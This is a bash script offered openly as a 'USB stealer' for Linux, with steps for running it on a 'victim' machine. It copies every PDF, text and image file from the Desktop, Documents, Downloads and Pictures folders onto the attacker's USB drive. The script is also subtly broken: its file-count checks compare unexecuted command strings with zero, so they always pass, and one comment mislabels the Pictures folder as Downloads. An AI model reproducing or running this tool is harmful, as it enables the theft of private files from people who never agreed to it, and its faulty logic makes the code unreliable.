#!/bin/bash
#This is a USB stealer (.pdf , .txt , .png , .jpg) for Linux OS.
#This script is made by: Cyber Warrior/(YT: SrbinHacking.)

#How to use it?
#1. Change "UUI" name from this script to the name of your USB drive.
#2. Copy script to the 'victim' Desktop. Navigate to Desktop. Change script permission to 755. Run the script.
#3. DONE!

#-----------------------------------------------------

#Delay.
delay='sleep 1'

#Defining colors.
green='\033[1;32m'
purple='\033[1;35m'
nocolor='\033[0m'

#Defining the paths.
path1=~/Desktop
path2=~/Documents
path3=~/Downloads
path4=~/Pictures

#Defining checks.
pdfcheck='ls -1 *.pdf 2>/dev/null | wc -l'
txtcheck='ls -1 *.txt 2>/dev/null | wc -l'
pngcheck='ls -1 *.png 2>/dev/null | wc -l'
jpgcheck='ls -1 *.jpg 2>/dev/null | wc -l'

#Defining file types.
pdf=*.pdf
txt=*.txt
png=*.png
jpg=*.jpg

#-----------------------------------------------------


cat << END
 _   _ ____  ____    ____  _             _                        
| | | / ___|| __ )  / ___|| |_ ___  __ _| | ___ _ __  
| | | \___ \|  _ \  \___ \| __/ _ \/ _  | |/ _ \ '__| 
| |_| |___) | |_) |  ___) | ||  __/ (_| | |  __/ |    
 \___/|____/|____/  |____/ \__\___|\__,_|_|\___|_| 

END

echo -e "${purple}USB Stealer (v0.1) by: Cyber Warrior/(YT: SrbinHacking)$nocolor"

$delay


echo
echo
echo -e "Checking for file path: $purple$path1$nocolor" 
$delay
echo
echo


#Coping files from PATH1: ~/Desktop
#Checking and coping '.pdf' files if they exist.
cd $path1
   echo "Checking for .pdf files in: $path1"
if [[ $pdfcheck != 0 ]]; then
   cp $pdf /media/$USER/UUI && 
   echo -e "${green}.pdf files have been copied SUCCESSFULLY!$nocolor" 
else
   echo "There are no '.pdf files here: $path1'"
fi


#Checking and coping '.txt' files if they exist.
cd $path1
   echo "Checking for .txt files in: $path1"
if [[ $txtcheck != 0 ]]; then
   cp $txt /media/$USER/UUI &&
   echo -e "${green}.txt files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.txt' files here: $path1"
fi


#Checking and coping '.png' files if they exist.
cd $path1
   echo "Checking for .png files in: $path1"
if [[ $pngcheck != 0 ]]; then
   cp $png /media/$USER/UUI &&
   echo -e "${green}.png files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.png' files here: $path1"
fi


#Checking and coping '.jpg' files if they exist.
cd $path1
   echo "Checking for .jpg files in: $path1"
if [[ $jpgcheck != 0 ]]; then
   cp $jpg /media/$USER/UUI &&
   echo -e "${green}.jpg files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.jpg' files here: $path1"
fi


echo
echo
echo -e "Checking for file path: $purple$path2$nocolor" 
$delay
echo
echo


#Coping files from PATH2: ~/Documents
#Checking and coping '.pdf' files if they exist.
cd $path2
   echo "Checking for .pdf files in: $path2"
if [[ $pdfcheck != 0 ]]; then
   cp $pdf /media/$USER/UUI && 
   echo -e "${green}.pdf files have been copied SUCCESSFULLY!$nocolor" 
else
   echo "There are no '.pdf files here: $path2'"
fi


#Checking and coping '.txt' files if they exist.
cd $path2
   echo "Checking for .txt files in: $path2"
if [[ $txtcheck != 0 ]]; then
   cp $txt /media/$USER/UUI &&
   echo -e "${green}.txt files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.txt' files here: $path2"
fi


#Checking and coping '.png' files if they exist.
cd $path2
   echo "Checking for .png files in: $path2"
if [[ $pngcheck != 0 ]]; then
   cp $png /media/$USER/UUI &&
   echo -e "${green}.png files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.png' files here: $path2"
fi


#Checking and coping '.jpg' files if they exist.
cd $path2
   echo "Checking for .jpg files in: $path2"
if [[ $jpgcheck != 0 ]]; then
   cp $jpg /media/$USER/UUI &&
   echo -e "${green}.jpg files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.jpg' files here: $path2"
fi


echo
echo
echo -e "Checking for file path: $purple$path3$nocolor" 
$delay
echo
echo


#Coping files from PATH3: ~/Downloads
#Checking and coping '.pdf' files if they exist.
cd $path3
   echo "Checking for .pdf files in: $path3"
if [[ $pdfcheck != 0 ]]; then
   cp $pdf /media/$USER/UUI && 
   echo -e "${green}.pdf files have been copied SUCCESSFULLY!$nocolor" 
else
   echo "There are no '.pdf files here: $path3'"
fi


#Checking and coping '.txt' files if they exist.
cd $path3
   echo "Checking for .txt files in: $path3"
if [[ $txtcheck != 0 ]]; then
   cp $txt /media/$USER/UUI &&
   echo -e "${green}.txt files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.txt' files here: $path3"
fi


#Checking and coping '.png' files if they exist.
cd $path3
   echo "Checking for .png files in: $path3"
if [[ $pngcheck != 0 ]]; then
   cp $png /media/$USER/UUI &&
   echo -e "${green}.png files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.png' files here: $path3"
fi


#Checking and coping '.jpg' files if they exist.
cd $path3
   echo "Checking for .jpg files in: $path3"
if [[ $jpgcheck != 0 ]]; then
   cp $jpg /media/$USER/UUI &&
   echo -e "${green}.jpg files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.jpg' files here: $path3"
fi


echo
echo
echo -e "Checking for file path: $purple$path4$nocolor" 
$delay
echo
echo


#Coping files from PATH4: ~/Downloads
#Checking and coping '.pdf' files if they exist.
cd $path4
   echo "Checking for .pdf files in: $path4"
if [[ $pdfcheck != 0 ]]; then
   cp $pdf /media/$USER/UUI && 
   echo -e "${green}.pdf files have been copied SUCCESSFULLY!$nocolor" 
else
   echo "There are no '.pdf files here: $path4'"
fi


#Checking and coping '.txt' files if they exist.
cd $path4
   echo "Checking for .txt files in: $path4"
if [[ $txtcheck != 0 ]]; then
   cp $txt /media/$USER/UUI &&
   echo -e "${green}.txt files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.txt' files here: $path4"
fi


#Checking and coping '.png' files if they exist.
cd $path4
   echo "Checking for .png files in: $path4"
if [[ $pngcheck != 0 ]]; then
   cp $png /media/$USER/UUI &&
   echo -e "${green}.png files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.png' files here: $path4"
fi


#Checking and coping '.jpg' files if they exist.
cd $path4
   echo "Checking for .jpg files in: $path4"
if [[ $jpgcheck != 0 ]]; then
   cp $jpg /media/$USER/UUI &&
   echo -e "${green}.jpg files have been copied SUCCESSFULLY!$nocolor"
else
   echo "There are no '.jpg' files here: $path4"
fi


$delay
exit



